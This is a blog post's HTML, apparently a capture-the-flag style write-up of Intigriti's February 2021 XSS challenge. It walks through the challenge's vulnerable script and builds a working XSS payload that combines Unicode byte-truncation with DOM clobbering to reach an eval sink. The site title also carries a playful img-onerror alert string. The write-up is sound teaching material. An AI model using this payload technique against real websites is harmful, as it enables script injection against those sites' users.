@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Intigriti&#39;s February XSS Challenge Writeup - &#34;&gt;&lt;img/src=&#34;/%ff/&#34;/onerror=alert(/blog.xss.am/)&gt;&#34;&lt;</title><meta name="Description" content="Cyber Insecurity blog"><meta property="og:title" content="Intigriti&#39;s February XSS Challenge Writeup" />
+<meta property="og:description" content="This month’s challenge, made by Holme, was a little bit different than the ones I have previously solved as it had a server-side processing issue." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.xss.am/2021/02/intigriti-february-xss-challenge/" /><meta property="og:image" content="https://blog.xss.am/2021/02/intigriti-february-xss-challenge/featured-image.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-02-20T01:00:00&#43;04:00" />
+<meta property="article:modified_time" content="2021-02-20T01:00:00&#43;04:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://blog.xss.am/2021/02/intigriti-february-xss-challenge/featured-image.png"/>
+<meta name="twitter:title" content="Intigriti&#39;s February XSS Challenge Writeup"/>
+<meta name="twitter:description" content="This month’s challenge, made by Holme, was a little bit different than the ones I have previously solved as it had a server-side processing issue."/>
+<meta name="application-name" content="/blog.xss.am/">
+<meta name="apple-mobile-web-app-title" content="/blog.xss.am/"><meta name="theme-color" content="#161209"><meta name="msapplication-TileColor" content="#161209"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png"><link rel="apple-touch-icon" sizes="120x120" href="/icons/apple-touch-icon.png"><link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="#161209"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.xss.am/2021/02/intigriti-february-xss-challenge/" /><link rel="prev" href="https://blog.xss.am/2020/12/armsec-2020/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.276e0f03323c1a097f41bcf92a0e23bc16079b9e1aae801b101c8fb90aa496875892c3263fbd90b62de11a4f7df38d3d.css" integrity="sha384-J24PAzI8Ggl/Qbz5Kg4jvBYHm54aroAbEByPuQqklodYksMmP72Qti3hGk998409"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Intigriti's February XSS Challenge Writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/blog.xss.am\/2021\/02\/intigriti-february-xss-challenge\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/blog.xss.am\/2021\/02\/intigriti-february-xss-challenge\/featured-image.png",
+                            "width":  1585 ,
+                            "height":  453 
+                        }],"genre": "posts","keywords": "challenge, xss, intigriti, unicode, eval, DOM clobbering","wordcount":  785 ,
+        "url": "https:\/\/blog.xss.am\/2021\/02\/intigriti-february-xss-challenge\/","datePublished": "2021-02-20T01:00:00+04:00","dateModified": "2021-02-20T01:00:00+04:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "davwwwx","logo": "https:\/\/blog.xss.am\/images\/Boo.png"},"author": {
+                "@type": "Person",
+                "name": "Davwwwx"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="auto" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="&#34;&gt;&lt;img/src=&#34;/%ff/&#34;/onerror=alert(/blog.xss.am/)&gt;&#34;&lt;"><span class="header-title-pre"><img src=x></span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="&#34;&gt;&lt;img/src=&#34;/%ff/&#34;/onerror=alert(/blog.xss.am/)&gt;&#34;&lt;"><span class="header-title-pre"><img src=x></span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Intigriti&#39;s February XSS Challenge Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/about" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Davwwwx</a></span>&nbsp;<span class="post-category">included in <a href="/categories/challenges/"><i class="far fa-folder fa-fw"></i>Challenges</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="20-02-2021">20-02-2021</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;785 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/2021/02/intigriti-february-xss-challenge/featured-image.png"
+        data-srcset="/2021/02/intigriti-february-xss-challenge/featured-image.png, /2021/02/intigriti-february-xss-challenge/featured-image.png 1.5x, /2021/02/intigriti-february-xss-challenge/featured-image.png 2x"
+        data-sizes="auto"
+        alt="/2021/02/intigriti-february-xss-challenge/featured-image.png"
+        title="/2021/02/intigriti-february-xss-challenge/featured-image.png" /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#issue-1---unicode-characters-improper-processing">Issue 1 - Unicode characters improper processing</a></li>
+        <li><a href="#issue-2---dom-clobbering-as-a-source-to-the-dangerous-sink">Issue 2 - DOM clobbering as a source to the dangerous sink</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>This month’s challenge, made by <a href="https://twitter.com/holme_sec" target="_blank" rel="noopener noreffer">Holme</a>, was a little bit different than the ones I have previously solved as it had a server-side processing issue.</p>
+<p>Vulnerable page - <a href="https://challenge-0221.intigriti.io/" target="_blank" rel="noopener noreffer">https://challenge-0221.intigriti.io/</a><br>
+Vulnerable script - <a href="https://challenge-0221.intigriti.io/script.js" target="_blank" rel="noopener noreffer">https://challenge-0221.intigriti.io/script.js</a></p>
+<h3 id="issue-1---unicode-characters-improper-processing">Issue 1 - Unicode characters improper processing</h3>
+<p>Digging into the <a href="https://challenge-0221.intigriti.io/script.js" target="_blank" rel="noopener noreffer">embedded script</a> (see the code below) we can see there is no direct source that could reach the only dangerous sink (<code>eval</code>) at line <strong>57</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">startGrade</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">text</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;assignmentText&#34;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
+  <span class="nx">checkLength</span><span class="p">(</span><span class="nx">text</span><span class="p">);</span>
+  <span class="nx">result</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">result</span> <span class="o">||</span> <span class="p">{</span>
+    <span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;Your submission is too short.&#34;</span><span class="p">,</span>
+    <span class="nx">error</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span>
+  <span class="p">};</span> <span class="c1">//If the result object hasn&#39;t been defined yet, the submission must be too short
+</span><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">endGrade</span><span class="p">();</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nx">getQAnswer</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">passQuiz</span><span class="p">())</span> <span class="p">{</span>
+      <span class="nx">result</span><span class="p">.</span><span class="nx">message</span> <span class="o">=</span> <span class="s2">&#34;We don&#39;t allow robots at the Unicodeversity (yet)!&#34;</span><span class="p">;</span>
+      <span class="nx">result</span><span class="p">.</span><span class="nx">error</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="nx">result</span><span class="p">.</span><span class="nx">grade</span> <span class="o">=</span> <span class="s2">&#34;ABCDEF&#34;</span><span class="p">[</span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="mi">6</span><span class="p">)];</span> <span class="c1">//Don&#39;t tell the students we don&#39;t actually read their submissions
+</span><span class="c1"></span>    <span class="p">}</span>
+    <span class="nx">endGrade</span><span class="p">();</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">endGrade</span><span class="p">()</span> <span class="p">{</span>
+  <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;message&#34;</span><span class="p">).</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">result</span><span class="p">.</span><span class="nx">message</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">grade</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span>
+      <span class="s2">&#34;grade&#34;</span>
+    <span class="p">).</span><span class="nx">innerText</span> <span class="o">=</span> <span class="sb">`You got a(n) </span><span class="si">${</span><span class="nx">result</span><span class="p">.</span><span class="nx">grade</span><span class="si">}</span><span class="sb">!`</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;share&#34;</span><span class="p">).</span><span class="nx">style</span><span class="p">.</span><span class="nx">visibility</span> <span class="o">=</span> <span class="s2">&#34;initial&#34;</span><span class="p">;</span>
+  <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span>
+    <span class="s2">&#34;share-link&#34;</span>
+  <span class="p">).</span><span class="nx">href</span> <span class="o">=</span> <span class="sb">`https://challenge-0221.intigriti.io/?assignmentTitle=</span><span class="si">${</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;assignmentTitle&#34;</span><span class="p">).</span><span class="nx">value</span>
+  <span class="si">}</span><span class="sb">&amp;assignmentText=</span><span class="si">${</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;assignmentText&#34;</span><span class="p">).</span><span class="nx">value</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
+  <span class="k">delete</span> <span class="nx">result</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">checkLength</span><span class="p">(</span><span class="nx">text</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nx">text</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">50</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">result</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;Thanks for your submission!&#34;</span> <span class="p">};</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">getQAnswer</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">answer</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;answer&#34;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="sr">/^[0-9]+$/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">answer</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">result</span> <span class="o">!==</span> <span class="s2">&#34;undefined&#34;</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">result</span><span class="p">.</span><span class="nx">questionAnswer</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">value</span><span class="o">:</span> <span class="nx">answer</span> <span class="p">};</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="nx">result</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">questionAnswer</span><span class="o">:</span> <span class="p">{</span> <span class="nx">value</span><span class="o">:</span> <span class="nx">answer</span> <span class="p">}</span> <span class="p">};</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">passQuiz</span><span class="p">()</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">result</span><span class="p">.</span><span class="nx">questionAnswer</span> <span class="o">!==</span> <span class="s2">&#34;undefined&#34;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nb">eval</span><span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">questionAnswer</span><span class="p">.</span><span class="nx">value</span> <span class="o">+</span> <span class="s2">&#34; == &#34;</span> <span class="o">+</span> <span class="nx">question</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kd">var</span> <span class="nx">question</span> <span class="o">=</span> <span class="sb">`</span><span class="si">${</span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="mi">10</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="si">}</span><span class="sb"> + </span><span class="si">${</span>
+  <span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="mi">10</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
+<span class="si">}</span><span class="sb">`</span><span class="p">;</span>
+
+<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;question&#34;</span><span class="p">).</span><span class="nx">innerText</span> <span class="o">=</span> <span class="sb">`</span><span class="si">${</span><span class="nx">question</span><span class="si">}</span><span class="sb"> = ?`</span><span class="p">;</span>
+
+<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;submit&#34;</span><span class="p">).</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&#34;click&#34;</span><span class="p">,</span> <span class="nx">startGrade</span><span class="p">);</span>
+
+<span class="kr">const</span> <span class="nx">urlParams</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="nx">urlParams</span><span class="p">.</span><span class="nx">has</span><span class="p">(</span><span class="s2">&#34;autosubmit&#34;</span><span class="p">))</span> <span class="p">{</span>
+  <span class="nx">startGrade</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>It is a common behavior for web apps to reflect an input&rsquo;s name or id if provided via request body or query string, so does this app (escaping, unfortunately).
+<figure><a class="lightgallery" href="/2021/02/intigriti-february-xss-challenge/escapedrefparam.png" title="Escaped reflected parameter" data-thumbnail="/2021/02/intigriti-february-xss-challenge/escapedrefparam.png" data-sub-html="<h2>Escaped reflected parameter</h2><p>Escaped reflected parameter</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="escapedrefparam.png"
+            data-srcset="/2021/02/intigriti-february-xss-challenge/escapedrefparam.png, escapedrefparam.png 1.5x, /2021/02/intigriti-february-xss-challenge/escapedrefparam.png 2x"
+            data-sizes="auto"
+            alt="/2021/02/intigriti-february-xss-challenge/escapedrefparam.png" />
+    </a><figcaption class="image-caption">Escaped reflected parameter</figcaption>
+    </figure></p>
+<p>But if we try a Unicode sequence (բարև), we can see it doesn&rsquo;t get processed normally.
+<figure><a class="lightgallery" href="/2021/02/intigriti-february-xss-challenge/unicoderefparam.png" title="Unicode reflected parameter" data-thumbnail="/2021/02/intigriti-february-xss-challenge/unicoderefparam.png" data-sub-html="<h2>Unicode reflected parameter</h2><p>Unicode reflected parameter</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="unicoderefparam.png"
+            data-srcset="/2021/02/intigriti-february-xss-challenge/unicoderefparam.png, unicoderefparam.png 1.5x, /2021/02/intigriti-february-xss-challenge/unicoderefparam.png 2x"
+            data-sizes="auto"
+            alt="/2021/02/intigriti-february-xss-challenge/unicoderefparam.png" />
+    </a><figcaption class="image-caption">Unicode reflected parameter</figcaption>
+    </figure></p>
+<p>The first part of a Unicode character byte pair gets rendered and the second pair is getting reflected as is,
+for example, in the case of letter <code>բ</code> (<strong>U+0562</strong>), <strong>05</strong> gets rendered and <strong>62</strong> is being returned.</p>
+<h3 id="issue-2---dom-clobbering-as-a-source-to-the-dangerous-sink">Issue 2 - DOM clobbering as a source to the dangerous sink</h3>
+<p>Now we can escape the reflection point with a doublequote using some character like <code>∀</code> (<strong>U+2200</strong>), but we cannot use event handlers because of CSP nor can construct an inline script element as we cannot guess a server-generated nonce value.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">script-src &#39;strict-dynamic&#39; &#39;nonce-iR/JMMPv7suDLRND7rsPGvDzJxU=&#39; &#39;unsafe-eval&#39; http: https:;object-src &#39;none&#39;;base-uri &#39;none&#39;;
+</code></pre></td></tr></table>
+</div>
+</div><p>As said above, looking for DOM vulnerabilities, the only usable sink is <code>eval</code> (at line <strong>56</strong>  in the original script) in <code>passQuiz</code> function.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-Javascript" data-lang="Javascript"><span class="kd">function</span> <span class="nx">passQuiz</span><span class="p">()</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">result</span><span class="p">.</span><span class="nx">questionAnswer</span> <span class="o">!==</span> <span class="s2">&#34;undefined&#34;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nb">eval</span><span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">questionAnswer</span><span class="p">.</span><span class="nx">value</span> <span class="o">+</span> <span class="s2">&#34; == &#34;</span> <span class="o">+</span> <span class="nx">question</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>And to reach it we should be able to control either <code>result.questionAnswer.value</code> or <code>question</code> variable.<br>
+No source reaches <code>question</code>, but in line <strong>4</strong> we can see that result can be taken from the <code>window</code> object.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-Javascript" data-lang="Javascript"><span class="kd">function</span> <span class="nx">startGrade</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">text</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;assignmentText&#34;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
+  <span class="nx">checkLength</span><span class="p">(</span><span class="nx">text</span><span class="p">);</span>
+  <span class="nx">result</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">result</span> <span class="o">||</span> <span class="p">{</span>
+    <span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;Your submission is too short.&#34;</span><span class="p">,</span>
+    <span class="nx">error</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>So to set its value we should abuse <a href="https://portswigger.net/web-security/dom-based/dom-clobbering" target="_blank" rel="noopener noreffer">DOM clobbering</a>. And the rendered payload should look something like this</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">elem</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;result&#34;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">elem</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;result&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;questionAnswer&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;alert(origin)//&#34;</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Looking through <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes" target="_blank" rel="noopener noreffer">MDN documentation</a>, the only usable element that has <code>value</code> attribute is <code>&lt;data&gt;</code> as only its first two letters (<strong>da</strong>) can be embedded as a hexadecimal value to start a tag normally instead of a gibberish.</p>
+<p>Finally we can construct our payload <code>?assignmentTitle=∀㸀㳚ta%20id=result㸀㳚ta%20id=result%20name=questionAnswer%20value=alert(origin)//&amp;autosubmit</code></p>
+<ul>
+<li><code>∀</code> (<strong>U+2200</strong>) to render a doublequote (<strong>&quot;</strong>),</li>
+<li><code>㸀</code> (<strong>U+3E00</strong>) to render a greater than sign (<strong>&gt;</strong>),</li>
+<li><code>㳚</code> (<strong>U+3CDA</strong>) to render a less than sign (<strong>&lt;</strong>) and reflect <strong>DA</strong> characters to start the <code>&lt;data&gt;</code> tag,</li>
+<li>and <code>autosubmit</code> query parameter to execute <code>startGrade</code> function without user interaction (line <strong>71</strong>).</li>
+</ul>
+<p>Which should result in something like this being injected into the page</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html">&#34;00&gt;00<span class="p">&lt;</span><span class="nt">data</span> <span class="na">id</span><span class="o">=</span><span class="s">result</span><span class="p">&gt;</span>00<span class="p">&lt;</span><span class="nt">data</span> <span class="na">id</span><span class="o">=</span><span class="s">result</span> <span class="na">name</span><span class="o">=</span><span class="s">questionAnswer</span> <span class="na">value</span><span class="o">=</span><span class="s">alert(origin)//</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/2021/02/intigriti-february-xss-challenge/alert.png" title="Pop the alert" data-thumbnail="/2021/02/intigriti-february-xss-challenge/alert.png" data-sub-html="<h2>Pop the alert</h2><p>Pop the alert</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="alert.png"
+            data-srcset="/2021/02/intigriti-february-xss-challenge/alert.png, alert.png 1.5x, /2021/02/intigriti-february-xss-challenge/alert.png 2x"
+            data-sizes="auto"
+            alt="/2021/02/intigriti-february-xss-challenge/alert.png" />
+    </a><figcaption class="image-caption">Pop the alert</figcaption>
+    </figure></p>
